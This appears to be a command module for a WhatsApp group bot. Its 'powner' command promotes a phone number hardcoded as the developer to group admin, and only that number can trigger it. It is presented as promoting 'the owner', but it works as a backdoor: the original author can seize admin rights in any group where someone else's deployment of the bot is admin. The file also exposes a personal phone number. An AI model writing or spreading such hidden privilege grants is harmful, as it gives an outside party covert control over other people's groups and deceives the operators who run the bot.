import { sendInteractive } from '../../lib/sendInteractive.js';
import { resolveTargetJid } from '../../lib/lidResolver.js';

const DEVELOPER_NUMBER = "254114885159";

const _num = (jid) => (jid || '').split('@')[0].split(':')[0].replace(/\D/g, '');

const extractJid = (p) => {
    if (typeof p === 'string') return p;
    if (!p) return '';
    const phone = p.phoneNumber || p.phone_number || '';
    if (phone) return typeof phone === 'string' && phone.includes('@') ? phone : phone + '@s.whatsapp.net';
    return p.id || p.jid || '';
};

const getParticipantNumber = (p) => {
    const phone = p.phoneNumber || p.phone_number || '';
    if (phone) {
        const n = _num(phone);
        if (n) return n;
    }
    const base = p.id || p.jid || '';
    if (base && !base.endsWith('@lid')) {
        const n = _num(base);
        if (n) return n;
    }
    const lid = p.lid || '';
    if (lid && !lid.endsWith('@lid')) {
        const n = _num(lid);
        if (n) return n;
    }
    return '';
};

const findDevInGroup = (participants) => participants.find(p => getParticipantNumber(p) === DEVELOPER_NUMBER);

const fmt = (title, msg) => `╭─❏ 「 ${title}」\n│ ${msg}\n╰───────────────\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`;

const retryPromote = async (client, groupId, participant, maxRetries = 5, baseDelay = 1500) => {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            await client.groupParticipantsUpdate(groupId, [participant], "promote");
            return true;
        } catch (e) {
            if (attempt === maxRetries) throw e;
            await new Promise(resolve => setTimeout(resolve, baseDelay * Math.pow(2, attempt - 1)));
        }
    }
};

export default {
    name: 'powner',
    aliases: ['promoteowner', 'makeowneradmin'],
    description: 'Promotes the owner to admin',
    run: async (context) => {
        const { client, m, isBotAdmin } = context;
        await client.sendMessage(m.chat, { react: { text: '⌛', key: m.reactKey } });

        if (!m.isGroup) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, fmt('POWNER', 'This command only works in groups.'));
        }

        const senderNum = _num(m.sender);
        if (senderNum !== DEVELOPER_NUMBER) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, fmt('POWNER', 'Only the owner can use this command.'));
        }

        if (!isBotAdmin) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, fmt('POWNER', 'I need admin privileges to perform this action.'));
        }

        try {
            const groupMetadata = await client.groupMetadata(m.chat);
            const participants = groupMetadata.participants || [];
            const ownerMember = findDevInGroup(participants);

            if (!ownerMember) {
                await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
                return sendInteractive(client, m, fmt('POWNER', 'Owner is not in this group.'));
            }

            if (ownerMember.admin) {
                await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
                return sendInteractive(client, m, fmt('POWNER', 'Owner is already an admin.'));
            }

            const targetJid = resolveTargetJid(extractJid(ownerMember), participants);
            if (!targetJid || targetJid.endsWith('@lid')) {
                await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
                return sendInteractive(client, m, fmt('POWNER', 'Could not resolve the owner JID in this group.'));
            }

            await retryPromote(client, m.chat, targetJid);
            await client.sendMessage(m.chat, { react: { text: '✅', key: m.reactKey } });
            return sendInteractive(client, m, fmt('PROMOTED', 'Owner has been promoted to admin.'));
        } catch (error) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, fmt('ERROR', 'Failed to promote: ' + error.message));
        }
    }
};
